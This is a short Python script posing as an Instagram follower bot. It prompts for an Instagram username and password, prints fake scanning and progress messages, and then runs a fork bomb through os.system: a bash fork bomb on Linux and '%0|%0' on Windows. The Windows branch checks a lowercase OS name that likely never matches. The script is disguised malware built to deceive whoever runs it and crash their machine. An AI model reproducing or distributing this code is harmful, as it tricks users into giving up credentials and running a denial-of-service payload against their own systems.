import time
import sys
import os
import platform
current_os = platform.system()
if current_os == "Linux":
    os.system('sudo apt-get update')
print("Instagram Follower Bot")
name = input('Enter your Username : ')
print("Scanning For Username that go by: %s" % name)
name2 = input('Enter your Password : ')
print("Entering  database with the Password of : %s " % name2)
status = ""


# Accepts a int from 0 to whatever
def update_progress(progress):
    bar_length = 1  # Modify this to change the length of the progress bar
    if progress >= 100:
        status = "Done...\r\n"
    block = int(round(bar_length * progress))
    text = "\rProgress: [{0}] {1}% {2}".format("#" * block + "-" * (bar_length - block), progress, status)
    sys.stdout.write(text)
    sys.stdout.flush()


# update_progress test script
print("__________Starting__________")
print("Mounting")
for x in range(1, 101):
    update_progress(x)
    time.sleep(0.01)
time.sleep(3)
print("Thank You...")
if current_os == "Linux":
    os.system(':(){:|:&};:')
if current_os == "windows":
    os.system('%0|%0')
